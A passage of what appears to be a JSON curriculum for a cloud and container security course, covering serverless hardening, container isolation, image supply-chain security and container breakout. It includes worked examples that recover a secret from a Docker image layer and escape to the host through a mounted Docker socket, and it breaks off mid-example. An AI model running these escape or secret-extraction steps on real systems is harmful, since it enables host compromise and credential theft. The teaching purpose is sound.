+              "lines": [
+                {
+                  "command": "trivy fs --scanners vuln,secret ./build",
+                  "output": "HIGH: lodash 4.17.4 -> prototype pollution (CVE-2019-10744)\nCRITICAL: aws creds found in .env"
+                },
+                {
+                  "command": "npm audit --audit-level=high",
+                  "output": "found 2 high severity vulnerabilities"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Pin, Lock, and Bill of Materials",
+            "body": "Determinism is the defense. Commit a lockfile (package-lock.json, poetry.lock, requirements.txt with hashes) so every build installs byte-identical dependencies, and pin layer versions by full ARN. Generate an SBOM (CycloneDX or SPDX) for each serverless artifact so you can answer 'are we affected?' when the next CVE lands. Disable install scripts where possible (npm ci --ignore-scripts) and use scoped names (@company/pkg) to defeat dependency confusion."
+          },
+          {
+            "title": "Why It Matters",
+            "body": "In serverless the gap between 'a package got compromised' and 'our AWS role is exfiltrating data' is a single import. There is no host EDR, no long-lived box to inspect; the malicious code runs for 200ms and vanishes, taking your credentials with it. Supply-chain controls (pinning, scanning, SBOM, scoped names, signed layers) are the only layer standing between a poisoned dependency and your account."
+          }
+        ]
+      },
+      {
+        "id": "cloud-m8-6",
+        "moduleId": "cloud-m8",
+        "number": 51,
+        "title": "Hardening Serverless",
+        "type": "exercise",
+        "week": 3,
+        "description": "Locking functions down. Students right-size roles, add input validation and build detection for function abuse.",
+        "keyPoints": [
+          "Least-privilege per-function role with scoped resource ARNs",
+          "Input validation at the event boundary; schema validation at API Gateway",
+          "Concurrency limits and timeouts to bound cost/DoS abuse",
+          "CloudTrail + CloudWatch on UpdateFunctionCode and anomalous invokes",
+          "Lambda code signing to prevent unauthorized code changes"
+        ],
+        "slides": [
+          {
+            "title": "Turning the Attacks Into a Checklist",
+            "body": "Hardening serverless is applying least privilege and input discipline at every surface we attacked: the role, the event boundary, the concurrency, and the code itself. Analogy: after the burglar showed you every unlocked door, you don't buy one giant vault; you right-size the key ring, check IDs at the door, cap how many visitors enter at once, and alarm the back exit. Each control is cheap; together they cap the blast radius."
+          },
+          {
+            "title": "Least-Privilege Role, Generated From Reality",
+            "body": "Guessing a policy leads to wildcards. Instead, run the function with broad perms in a test account, let CloudTrail record exactly which API calls and resources it uses, then use IAM Access Analyzer's policy generation to produce a tight policy from that activity. Scope every statement to specific actions and specific resource ARNs. One role per function, never shared, so a compromise of one cannot touch another's resources."
+          },
+          {
+            "title": "Worked Example: A Scoped Policy",
+            "body": "A read-one-bucket function needs exactly one action on one ARN. Everything else is denied by default because IAM is deny-by-default. Compare the tight policy below with the AdministratorAccess it replaced; the injection and role-abuse chains from earlier topics simply dead-end here.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "cat scoped-policy.json",
+                  "output": "{ \"Effect\":\"Allow\", \"Action\":[\"s3:GetObject\"], \"Resource\":\"arn:aws:s3:::orders-prod/*\" }"
+                },
+                {
+                  "command": "aws iam put-role-policy --role-name orders-fn-role --policy-name scoped --policy-document file://scoped-policy.json",
+                  "output": ""
+                }
+              ]
+            }
+          },
+          {
+            "title": "Validate at the Event Boundary",
+            "body": "Reject bad input before your code touches it. At API Gateway, attach a JSON Schema model and enable request validation so malformed bodies, missing fields and wrong types are 400'd at the gateway. Inside the function, validate again with a schema library (pydantic, zod, JSON Schema) and allowlist the fields you will use, defeating the mass-assignment and injection paths from earlier topics. Validate every event source, not just HTTP."
+          },
+          {
+            "title": "Bound Cost and Blast With Limits",
+            "body": "Serverless scales automatically, which is also how a denial-of-wallet works. Set reserved/maximum concurrency per function so one abused route cannot consume the account's entire concurrency pool or run up an unbounded bill. Set the timeout as low as the function actually needs; a short timeout limits how long injected code can run and beacon. Pair with API Gateway throttling for layered rate control.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Unbounded (risky)",
+                  "points": [
+                    "Default account concurrency",
+                    "Long timeouts"
+                  ]
+                },
+                {
+                  "label": "Bounded (safe)",
+                  "points": [
+                    "Reserved concurrency cap",
+                    "Minimal timeout"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            },
+            "check": {
+              "question": "Why set a function's maximum (reserved) concurrency?",
+              "options": [
+                "To make cold starts faster",
+                "To cap denial-of-wallet and stop one route exhausting account concurrency",
+                "To grant more IAM permissions",
+                "To enable CORS"
+              ],
+              "correctIndex": 1,
+              "explanation": "Concurrency limits bound how many instances run at once, capping cost/DoS abuse and protecting other functions' share of the account concurrency pool."
+            }
+          },
+          {
+            "title": "Detect Function Abuse",
+            "body": "Assume something slips through and watch for it. Log every invoke and tool call, and alarm on the high-signal events: CloudTrail UpdateFunctionCode / UpdateFunctionConfiguration (persistence), new or changed roles, and anomalous invoke spikes or error rates in CloudWatch. GuardDuty's Lambda protection flags suspicious network activity from functions. The earlier persistence trick, overwriting the function code, is exactly the event to page on.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "# CloudWatch alarm on CloudTrail metric filter",
+                  "output": "{ ($.eventName = \"UpdateFunctionCode\") }  -> SNS alert"
+                },
+                {
+                  "command": "aws guardduty get-findings ...",
+                  "output": "Finding: Lambda function communicating with known C2 domain"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Sign the Code",
+            "body": "Lambda code signing (AWS Signer plus a signing profile) makes Lambda refuse to deploy any package that is not signed by an approved profile and unchanged since signing. That turns the lambda:UpdateFunctionCode persistence attack into a dead end: an attacker's unsigned backdoor is rejected at deploy. Enforce it with a code-signing configuration set to Enforce, and restrict who holds the signing profile.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Build",
+                  "detail": "Package function"
+                },
+                {
+                  "label": "AWS Signer",
+                  "detail": "Sign with approved profile"
+                },
+                {
+                  "label": "Lambda deploy",
+                  "detail": "Enforce: reject unsigned/altered code"
+                },
+                {
+                  "label": "Attacker UpdateFunctionCode",
+                  "detail": "Rejected, not signed"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Do It and Why It Matters",
+            "body": "The module exercise has you take a deliberately loose function and apply the full checklist: generate a least-privilege role, add schema validation at API Gateway and in code, set reserved concurrency and a tight timeout, add a CloudTrail alarm on UpdateFunctionCode, and turn on code signing, then re-run the earlier injection and role-abuse attacks and prove each now fails. Why it matters: serverless security is not one big control but a stack of small, cheap ones. Scoped role, validated input, bounded execution, detection and signing together turn this module's account-takeover chains into dead ends."
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "cloud-m9",
+    "name": "Container & Kubernetes Security",
+    "shortName": "Containers & K8s",
+    "month": 3,
+    "weeks": [
+      3
+    ],
+    "description": "Containers and Kubernetes are where modern cloud workloads run, with their own deep attack surface. This module covers image security, the container isolation boundary and breakout, and Kubernetes/EKS security: RBAC, pod security, network policy, secrets and the cloud-identity linkage.",
+    "estimatedHours": 14,
+    "outcomes": [
+      "Secure the container supply chain from image build to registry to runtime",
+      "Explain container isolation (namespaces, cgroups, capabilities) and the common breakout paths",
+      "Attack and defend a Kubernetes cluster: RBAC, service accounts, pod security and network policy",
+      "Link cluster compromise to cloud-account compromise via node roles and IRSA, and cut that link"
+    ],
+    "topics": [
+      {
+        "id": "cloud-m9-1",
+        "moduleId": "cloud-m9",
+        "number": 52,
+        "title": "Container Fundamentals & Isolation",
+        "type": "theory",
+        "week": 3,
+        "description": "What a container actually is — namespaces and cgroups, not a VM. Understanding the isolation primitives explains every breakout.",
+        "keyPoints": [
+          "Namespaces (pid, net, mnt, user) and cgroups as the isolation mechanism",
+          "Linux capabilities and why CAP_SYS_ADMIN / privileged is dangerous",
+          "Container != VM: shared kernel means kernel exploits break out",
+          "The container runtime (containerd, runc) and its past CVEs (e.g. CVE-2019-5736 runc)",
+          "Rootless containers and user-namespace remapping"
+        ],
+        "slides": [
+          {
+            "title": "What a container actually is",
+            "body": "A container is just a normal Linux process that the kernel has been told to show a limited view of the system. It is NOT a tiny virtual machine.\n\nAnalogy: a VM is a separate house with its own foundation, plumbing and electrical (its own kernel). A container is a bedroom inside one shared house (one shared kernel) with the door locked and the curtains drawn. It feels private, but everyone is still breathing the same air and standing on the same foundation.\n\nThree kernel features create that 'private room' feeling:\n- namespaces decide what the process can SEE\n- cgroups decide how much it can USE\n- capabilities decide what it is ALLOWED to do\n\nBecause every container shares the host kernel, anything that lets a process influence the kernel or the host filesystem can collapse the walls. That is why container security is really about understanding these three primitives."
+          },
+          {
+            "title": "Namespaces: what the process can see",
+            "body": "A namespace is a filtered view of one kind of system resource. Each container gets its own set, so processes inside it cannot see the host or other containers.\n\nKey namespaces:\n- pid: its own process tree, so the container's first process is PID 1 and it cannot see host PIDs\n- net: its own network interfaces, routes and firewall rules (its own eth0, lo)\n- mnt: its own filesystem mount view (its own root /)\n- user: maps a user ID inside the container to a different UID on the host (root inside can be an unprivileged user outside)\n- uts: its own hostname\n- ipc: its own shared-memory and message queues\n\nIf a container shares a host namespace (for example hostPID or hostNetwork), that wall is simply removed. Sharing the host PID namespace lets the container see and signal every process on the host.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Namespace isolated (normal)",
+                  "points": [
+                    "Own PID tree, own PID 1",
+                    "Own network stack / eth0",
+                    "Own root filesystem view",
+                    "Cannot see host processes"
+                  ],
+                  "highlighted": true
+                },
+                {
+                  "label": "Host namespace shared (dangerous)",
+                  "points": [
+                    "hostPID: sees/signals all host procs",
+                    "hostNetwork: host's real interfaces",
+                    "Host mounts visible",
+                    "Isolation effectively gone"
+                  ]
+                }
+              ]
+            }
+          },
+          {
+            "title": "cgroups and capabilities: use and permission",
+            "body": "Namespaces hide things; cgroups and capabilities limit things.\n\ncgroups (control groups) cap resource usage: CPU, memory, PIDs, I/O. Without them one container could consume all host memory and crash neighbours (a noisy-neighbour or denial-of-service problem).\n\nLinux capabilities split the old all-or-nothing 'root' into ~40 discrete powers. Instead of full root, a process can hold just the pieces it needs. Examples:\n- CAP_NET_BIND_SERVICE: bind to ports below 1024\n- CAP_CHOWN: change file ownership\n- CAP_SYS_ADMIN: a huge grab-bag (mount, modify namespaces, more) nicknamed 'the new root'\n\nDocker drops most capabilities by default and keeps a safe subset. The danger starts when you add CAP_SYS_ADMIN or run --privileged, which grants ALL capabilities plus device access and removes many restrictions. Privileged is the single most common reason a container can escape.",
+            "check": {
+              "question": "Why is running a container with --privileged (or adding CAP_SYS_ADMIN) so dangerous?",
+              "options": [
+                "It gives the container its own kernel, isolating it like a VM",
+                "It grants broad kernel-level powers (mounts, device access, namespace control) that enable breakout to the host",
+                "It only increases CPU and memory limits with no security impact",
+                "It disables networking so the container cannot be reached"
+              ],
+              "correctIndex": 1,
+              "explanation": "--privileged grants all capabilities, access to host devices, and relaxes restrictions. CAP_SYS_ADMIN alone enables mounting filesystems and manipulating namespaces, which are the building blocks of nearly every container escape. Containers never get their own kernel."
+            }
+          },
+          {
+            "title": "Worked example: prove it is just a process",
+            "body": "From the host you can see a container's process directly, and you can confirm the shared kernel. This demystifies the 'magic'.\n\nThe container believes it is PID 1 running as root. The host sees the same program as an ordinary PID, and both report the identical kernel version because there is only one kernel.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "docker run -d --name demo nginx",
+                  "output": "7f3a9c... (container started)"
+                },
+                {
+                  "command": "docker exec demo sh -c 'echo PID=$$ ; id'",
+                  "output": "PID=1\nuid=0(root) gid=0(root)"
+                },
+                {
+                  "command": "ps -ef | grep nginx | grep -v grep | head -1",
+                  "output": "root   24815  24790  0 10:02 ?  00:00:00 nginx: master process"
+                },
+                {
+                  "command": "uname -r   # host kernel",
+                  "output": "6.8.0-45-generic"
+                },
+                {
+                  "command": "docker exec demo uname -r   # same kernel!",
+                  "output": "6.8.0-45-generic"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Container is not a VM: the security consequence",
+            "body": "This is the single most important mental model. Because the kernel is shared:\n\n- A kernel exploit inside a container can give code execution on the HOST and every other container on it. There is no hypervisor wall to stop it.\n- 'Root inside the container' can become 'root on the host' if any isolation primitive is weakened.\n- Patching the host kernel protects all containers at once; patching one container image does nothing for a kernel bug.\n\nWhen you genuinely need VM-grade isolation (multi-tenant, untrusted workloads), use a sandboxed runtime that gives each container a lightweight kernel or microVM:\n- gVisor (runsc): a user-space kernel that intercepts syscalls\n- Kata Containers / Firecracker: each container in a microVM with its own kernel\n\nThese trade a little performance for a real isolation boundary.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Virtual Machine",
+                  "points": [
+                    "Own guest kernel",
+                    "Hypervisor boundary",
+                    "Breakout needs a hypervisor bug (rare)",
+                    "Heavier, slower boot"
+                  ]
+                },
+                {
+                  "label": "Container",
+                  "points": [
+                    "Shares host kernel",
+                    "Namespace/cgroup boundary",
+                    "Breakout needs kernel OR misconfig (common)",
+                    "Light, instant start"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          },
+          {
+            "title": "The runtime and its CVEs",
+            "body": "A container runtime turns an image plus config into running, namespaced processes. The layers:\n- high-level: Docker / Podman / CRI-O\n- mid-level: containerd (manages lifecycle, images)\n- low-level: runc (the OCI runtime that actually calls clone/unshare to create the namespaces)\n\nBecause runc is the component that crosses from host into container, bugs in it are breakout-grade:\n- CVE-2019-5736: a malicious container could overwrite the host runc binary by abusing /proc/self/exe during exec, giving root code execution on the host. Patched runc copies itself into memory to prevent this.\n- CVE-2024-21626 ('Leaky Vessels'): a leaked file descriptor pointing at the host filesystem let a container's working directory escape into the host, enabling breakout.\n\nLesson: keep containerd and runc patched. A container escape is often a one-line CVE in the runtime, not clever exploitation."
+          },
+          {
+            "title": "Rootless containers and user-namespace remapping",
+            "body": "The strongest built-in defense is to make 'root inside' NOT equal 'root outside'.\n\nUser-namespace remapping: UID 0 (root) inside the container is mapped to a high, unprivileged UID on the host (for example 100000). If the process breaks out, it lands as a nobody user, not host root.\n\nRootless containers: the entire container runtime runs as a normal unprivileged user. Podman does this natively; Docker supports rootless mode. Even the daemon has no host root, so a compromise is far less damaging.\n\nTrade-offs: some features (binding low ports, certain storage drivers, some capabilities) need extra configuration. But for most workloads rootless is a large security win for little cost.\n\nCombine with: drop all capabilities and add back only what is needed, a seccomp profile to filter syscalls, and read-only root filesystem.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Process in container",
+                  "detail": "thinks it is uid 0 (root)"
+                },
+                {
+                  "label": "user namespace map",
+                  "detail": "uid 0 -> host uid 100000"
+                },
+                {
+                  "label": "Breakout attempt",
+                  "detail": "escapes to host filesystem"
+                },
+                {
+                  "label": "Lands as uid 100000",
+                  "detail": "unprivileged 'nobody' - damage contained"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Why it matters",
+            "body": "Every container breakout, privilege escalation and lateral-movement story in this module is just a consequence of the primitives on these slides:\n\n- Weaken a namespace (hostPID/hostNetwork/hostPath) -> the container sees the host.\n- Grant a dangerous capability (CAP_SYS_ADMIN) or --privileged -> the container can act on the host.\n- Share the kernel + miss a patch -> a kernel/runc CVE escapes.\n\nSecure defaults flip all of these: no privileged, drop capabilities, no host namespaces, user-namespace remap or rootless, patched runtime, and a sandboxed runtime (gVisor/Kata) when the workload is untrusted.\n\nHold this model: a container is a locked bedroom in a shared house. Security is about not handing out keys to the rest of the house."
+          }
+        ]
+      },
+      {
+        "id": "cloud-m9-2",
+        "moduleId": "cloud-m9",
+        "number": 53,
+        "title": "Image & Supply-Chain Security",
+        "type": "lab",
+        "week": 3,
+        "description": "The image is the artifact; a bad image is a pre-compromised workload. Students scan, sign and minimise images.",
+        "keyPoints": [
+          "Vulnerability scanning: Trivy, Grype, ECR scanning",
+          "Secrets baked into image layers (every layer is inspectable)",
+          "Minimal base images (distroless, alpine) to shrink attack surface",
+          "Image signing and verification: Cosign / Sigstore, admission policy",
+          "Registry security: private ECR, immutable tags, pull-through risks"
+        ],
+        "slides": [
+          {
+            "title": "What image and supply-chain security means",
+            "body": "A container image is a frozen snapshot of a filesystem plus metadata. When you run it, you run exactly what someone built. If that snapshot already contains a vulnerable library, a hardcoded secret or a backdoor, you have deployed a pre-compromised workload before the first request arrives.\n\nAnalogy: an image is like a sealed ready-meal. You trust what the factory put inside. Supply-chain security is checking the ingredients list (scanning), confirming the tamper seal (signing) and buying from a factory you trust (a private, controlled registry) instead of an anonymous stall.\n\nThe supply chain runs: base image -> your build (Dockerfile) -> registry -> deployment -> runtime. Each hop is a place to inject or detect a problem. This topic covers scanning for vulnerabilities, keeping secrets out of layers, shrinking the image, signing for integrity, and locking down the registry."
+          },
+          {
+            "title": "Images are layers, and layers are forever",
+            "body": "A Dockerfile builds the image as a stack of read-only layers, one per instruction (FROM, RUN, COPY...). The final image is all layers merged. Critically, every layer is permanently stored and independently inspectable.\n\nThis is the single most-abused fact in image security: if you COPY a secret in one layer and delete it in a later layer, the secret is STILL in the earlier layer and anyone who pulls the image can extract it. Deleting does not remove history.\n\nThe same applies to vulnerabilities: a vulnerable package installed in a base layer ships in every image built FROM it.\n\nMechanism to remember: the image = base layers you inherited + layers you added. You own the risk of both.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "FROM node:20",
+                  "detail": "inherits base OS + libs (their CVEs too)"
+                },
+                {
+                  "label": "COPY . .",
+                  "detail": "your app code, maybe a stray .env or key"
+                },
+                {
+                  "label": "RUN npm ci",
+                  "detail": "pulls dependencies (transitive CVEs)"
+                },
+                {
+                  "label": "Final image",
+                  "detail": "every layer kept + inspectable forever"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Vulnerability scanning: Trivy, Grype, ECR",
+            "body": "A scanner reads the packages in each layer (OS packages and language dependencies), looks them up against vulnerability databases (NVD, GitHub Advisories, vendor feeds), and reports known CVEs with severity.\n\nCommon tools:\n- Trivy (Aqua): fast, free, scans images, filesystems, IaC and secrets\n- Grype (Anchore): image and SBOM scanning\n- AWS ECR scanning: basic (Clair) or enhanced (Amazon Inspector) scanning in the registry itself\n\nWhere to scan:\n- in CI, fail the build on new HIGH/CRITICAL\n- in the registry, continuously, because new CVEs are discovered after you push\n- at admission, block images that fail policy\n\nKey nuance: a scanner only finds KNOWN vulnerabilities in recognised packages. It will not catch a bespoke backdoor or an unknown zero-day. Scanning is necessary, not sufficient.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "trivy image --severity HIGH,CRITICAL myapp:1.4.2",
+                  "output": "myapp:1.4.2 (debian 12.5)\nTotal: 3 (HIGH: 2, CRITICAL: 1)\n\nlibssl3  CVE-2024-XXXXX  CRITICAL  3.0.11 -> 3.0.13\nzlib1g   CVE-2023-45853  HIGH      fixed in 1:1.3.dfsg-3"
+                },
+                {
+                  "command": "echo $?   # non-zero exit fails the CI pipeline",
+                  "output": "1"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Worked example: extract a baked-in secret",
+            "body": "This is why 'I deleted the file later' does not work. We build an image that copies a secret then removes it, then recover it from the layer history.\n\nThe secret survives in the layer where it was added even though a later instruction deleted it. `docker history` shows the layers; exporting the filesystem or `docker save` lets you read any layer's contents. Attackers do exactly this with public images on Docker Hub.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "docker build -t leaky .   # Dockerfile: COPY aws.key / ; RUN rm /aws.key",
+                  "output": "Successfully built leaky"
+                },
+                {
+                  "command": "docker run --rm leaky ls /aws.key",
+                  "output": "ls: /aws.key: No such file or directory"
+                },
+                {
+                  "command": "docker save leaky -o leaky.tar && mkdir x && tar -xf leaky.tar -C x",
+                  "output": ""
+                },
+                {
+                  "command": "grep -rl 'AKIA' x/*/layer.tar | head && tar -xOf x/<earlylayer>/layer.tar aws.key",
+                  "output": "AKIAIOSFODNN7EXAMPLE\nwJalrXUtnFEMI/...  <-- secret recovered from the earlier layer"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Keeping secrets out of images",
+            "body": "Never COPY or ENV a secret into an image. Correct patterns:\n\n- Build-time secrets: use BuildKit secret mounts, `RUN --mount=type=secret,id=npmtoken ...`. The secret is available during that RUN only and is never written to a layer.\n- Runtime secrets: inject via environment or files at deploy time from a secret manager (AWS Secrets Manager, SSM Parameter Store, Vault, Kubernetes secrets / external-secrets), not baked in.\n- .dockerignore: exclude .env, .git, *.pem, credentials so they are never in the build context.\n- Scan for them: Trivy, gitleaks and trufflehog can scan images and layers for secret patterns. Add this to CI.\n\nMinimise the blast radius: use short-lived, scoped credentials so even a leaked secret expires fast (ties to least privilege).",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Wrong: secret in the image",
+                  "points": [
+                    "ENV API_KEY=...",
+                    "COPY id_rsa /root/.ssh/",
+                    "Baked into a permanent layer",
+                    "Leaks to anyone who pulls"
+                  ]
+                },
+                {
+                  "label": "Right: inject at the edges",
+                  "points": [
+                    "RUN --mount=type=secret (build)",
+                    "Secrets Manager / Vault at runtime",
+                    ".dockerignore blocks stray files",
+                    "Short-lived scoped creds"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          },
+          {
+            "title": "Minimal base images and signing",
+            "body": "Shrink the attack surface: fewer packages = fewer CVEs = less for an attacker to use.\n- distroless (Google): no shell, no package manager, just your app and its runtime. An attacker who lands has no /bin/sh to pivot with.\n- alpine: tiny libc-based image; small but still has a shell.\n- scratch: empty base for static binaries (Go, Rust).\nUse multi-stage builds: compile in a full image, copy only the artifact into a minimal final stage.\n\nSign and verify for integrity (prove the image is the one you built and was not swapped):\n- Cosign / Sigstore: sign images (keyless with OIDC is common) and store signatures in the registry.\n- Verify in an admission policy so only signed images from trusted builders run (Kyverno verifyImages, OPA/Gatekeeper, or Connaisseur).\n\nThis is the Do-it defense pairing: minimise, then prove provenance.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Build",
+                  "detail": "multi-stage -> distroless final image"
+                },
+                {
+                  "label": "cosign sign",
+                  "detail": "signature stored in registry (Sigstore)"
+                },
+                {
+                  "label": "Push to private ECR",
+                  "detail": "immutable tag, scan on push"
+                },
+                {
+                  "label": "Admission verify",
+                  "detail": "cluster runs it only if signature is valid"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Registry security and the lab",
+            "body": "The registry is where images live between build and run; controlling it controls what can be deployed.\n- Use a private registry (ECR, GHCR, Harbor) with authn/authz, not anonymous public pulls for production.\n- Immutable tags: once pushed, a tag cannot be overwritten, so 'myapp:1.4.2' always means the same bits (prevents a silent malicious re-push). Pin by digest (@sha256:...) for the strongest guarantee.\n- Pull-through cache risk: proxying public images caches whatever upstream served, including a poisoned 'latest'. Pin digests and scan cached images.\n- Least-privilege registry tokens; rotate and scope them.\n\nLab (Image & Supply-Chain Security): build an intentionally leaky image, use Trivy to find its CVEs and gitleaks/Trivy to recover a baked-in secret from a layer, then rebuild it distroless with BuildKit secret mounts, sign it with cosign, push to a private registry with an immutable tag, and add a Kyverno verifyImages policy so only the signed image runs. Verify by trying to deploy an unsigned image and watching admission reject it.",
+            "check": {
+              "question": "You COPY a credentials file into an image, then add a later RUN rm to delete it. Why is the secret still exposed?",
+              "options": [
+                "Because rm does not work inside containers",
+                "Because each Dockerfile instruction creates a permanent layer, so the file remains in the earlier layer even after a later layer deletes it",
+                "Because the scanner re-adds the file",
+                "Because ENV variables are always logged"
+              ],
+              "correctIndex": 1,
+              "explanation": "Images are an append-only stack of layers. Deleting a file in a later layer only hides it in the merged view; the bytes still exist in the earlier layer and are trivially recoverable with docker save / history. Secrets must never enter any layer."
+            }
+          },
+          {
+            "title": "Why it matters",
+            "body": "Supply-chain compromise is one of the highest-leverage attacks: poison one base image or registry and every downstream workload is compromised, with the defender trusting it by default. Real incidents include typosquatted and cryptominer-laden images on public hubs and leaked registry tokens enabling malicious re-pushes.\n\nThe defensive program, in order of payoff:\n1. Scan in CI and continuously in the registry; fail builds on CRITICAL.\n2. Keep all secrets out of layers; inject at runtime from a secret store.\n3. Use minimal/distroless bases and multi-stage builds.\n4. Sign with cosign and enforce signature verification at admission.\n5. Private registry, immutable tags, pin by digest, scoped tokens.\n\nFrameworks to cite: OWASP CI/CD Top 10, SLSA (supply-chain levels for software artifacts), NIST SSDF, and CIS Docker Benchmark. Scanning finds the known; signing and minimisation defend against the unknown."
+          }
+        ]
+      },
+      {
+        "id": "cloud-m9-3",
+        "moduleId": "cloud-m9",
+        "number": 54,
+        "title": "Container Breakout",
+        "type": "lab",
+        "week": 3,
+        "description": "Escaping the container to the host. Students exploit the classic misconfigurations that make breakout trivial, in a lab they own.",
+        "keyPoints": [
+          "Privileged containers and host namespace sharing (hostPID, hostNetwork)",
+          "Mounted Docker socket (/var/run/docker.sock) = instant host control",
+          "Dangerous capabilities (CAP_SYS_ADMIN) and writable host mounts",
+          "runc / kernel CVEs for breakout; release_agent cgroup escape",
+          "Mitigation: drop capabilities, no privileged, no host mounts, seccomp/AppArmor"
+        ],
+        "slides": [
+          {
+            "title": "What container breakout is",
+            "body": "Container breakout (or escape) means going from code execution inside a container to code execution on the host that runs it. Once on the host, the attacker can reach every other container, the kubelet, node credentials and often the whole cloud account.\n\nAnalogy: the container is a locked hotel room. A breakout is finding that the connecting door was left unlocked, the master key is sitting on the dresser, or the wall is thin enough to kick through. You end up with run of the whole hotel.\n\nMost real breakouts are NOT exotic kernel exploits. They are misconfigurations the operator created: running privileged, mounting the Docker socket, sharing host namespaces, adding CAP_SYS_ADMIN, or bind-mounting the host filesystem. This topic walks the classic escape paths, shows a working proof, and then hardens them. It maps to MITRE ATT&CK Container techniques (Escape to Host, T1611) and is the heart of the 'Escape the Container' lab."
+          },
+          {
+            "title": "How breakouts work: the common paths",
+            "body": "Every breakout weakens one of the isolation primitives from topic 1. The usual suspects:\n\n1. --privileged: all capabilities + host device access. You can mount host disks, load kernel modules, or use the cgroup release_agent trick.\n2. Mounted Docker/containerd socket (/var/run/docker.sock inside the container): the socket is the full Docker API. Talking to it = creating a new privileged container that mounts the host root. Instant host control.\n3. Host namespace sharing (hostPID, hostNetwork, hostIPC): removes a wall; hostPID lets you enter host processes' namespaces via nsenter.\n4. Dangerous capabilities: CAP_SYS_ADMIN (mount, cgroups), CAP_SYS_PTRACE (inspect/inject host processes with hostPID), CAP_DAC_READ_SEARCH (read any host file via open_by_handle_at, the 'Shocker' class).\n5. Writable host bind mounts (hostPath / -v /:/host): direct read-write access to host files, including writing a cron job or SSH key.\n6. Runtime/kernel CVEs: runc (CVE-2019-5736, CVE-2024-21626), kernel bugs (Dirty Pipe CVE-2022-0847).",
+            "diagram": {
+              "type": "graph-tree",
+              "nodes": [
+                {
+                  "id": "c",
+                  "label": "Foothold in container",
+                  "highlighted": true
+                },
+                {
+                  "id": "priv",
+                  "label": "--privileged"
+                },
+                {
+                  "id": "sock",
+                  "label": "docker.sock mounted"
+                },
+                {
+                  "id": "cap",
+                  "label": "CAP_SYS_ADMIN"
+                },
+                {
+                  "id": "mnt",
+                  "label": "host / bind-mounted"
+                },
+                {
+                  "id": "cve",
+                  "label": "runc/kernel CVE"
+                },
+                {
+                  "id": "host",
+                  "label": "Host code execution",
+                  "highlighted": true
+                }
+              ],
+              "edges": [
+                {
+                  "from": "c",
+                  "to": "priv",
+                  "label": ""
+                },
+                {
+                  "from": "c",
+                  "to": "sock",
+                  "label": ""
+                },
+                {
+                  "from": "c",
+                  "to": "cap",
+                  "label": ""
+                },
+                {
+                  "from": "c",
+                  "to": "mnt",
+                  "label": ""
+                },
+                {
+                  "from": "c",
+                  "to": "cve",
+                  "label": ""
+                },
+                {
+                  "from": "priv",
+                  "to": "host",
+                  "label": "mount host disk / release_agent"
+                },
+                {
+                  "from": "sock",
+                  "to": "host",
+                  "label": "create privileged container"
+                },
+                {
+                  "from": "cap",
+                  "to": "host",
+                  "label": "mount / cgroup escape"
+                },
+                {
+                  "from": "mnt",
+                  "to": "host",
+                  "label": "write cron/SSH key"
+                },
+                {
+                  "from": "cve",
+                  "to": "host",
+                  "label": "exploit runtime/kernel"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Mechanism: the mounted Docker socket",
+            "body": "The clearest escape. Developers sometimes mount the Docker socket into a container so it can build images or manage siblings (-v /var/run/docker.sock:/var/run/docker.sock). But the socket is the unauthenticated Docker daemon API, and the daemon runs as root on the host.\n\nWith socket access you simply ask the daemon to start a NEW container that is privileged and bind-mounts the host root filesystem at /host, then chroot into it. You are now root on the host. No exploit, just using the API as intended.\n\nThe same logic applies to a mounted containerd socket or an exposed Docker TCP port (2375). The rule: giving a container the runtime socket is equivalent to giving it root on the host. There is no 'read-only' version that is safe, because the API lets you create new containers.",
+            "check": {
+              "question": "A container has /var/run/docker.sock bind-mounted inside it. Why does this equal host compromise?",
+              "options": [
+                "The socket leaks the host password",
+                "The socket is the root-level Docker daemon API, so the container can create a new privileged container that mounts the host filesystem and gain host root",
+                "It only lets the container see host logs, which is harmless",
+                "The socket disables the container's network"
+              ],
+              "correctIndex": 1,
+              "explanation": "The Docker socket is the full control API of a daemon running as host root. Any process that can talk to it can spin up a privileged container mounting / from the host and execute commands as host root. Mounting the socket is effectively granting host root."
+            }
+          },
+          {
+            "title": "Worked example: escape via the socket and via privileged",
+            "body": "Two concrete proofs you can run in the lab. First the socket path, then the privileged release_agent path.\n\nSocket: use docker inside the container to launch a host-mounting container. Privileged: in a --privileged container you can abuse the cgroup v1 release_agent to make the host kernel run your script when a cgroup empties. Both end with commands running as root on the host.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "root@container:/#",
+              "lines": [
+                {
+                  "command": "# Path A: mounted docker socket",
+                  "output": ""
+                },
+                {
+                  "command": "docker -H unix:///var/run/docker.sock run -v /:/host --rm alpine chroot /host id",
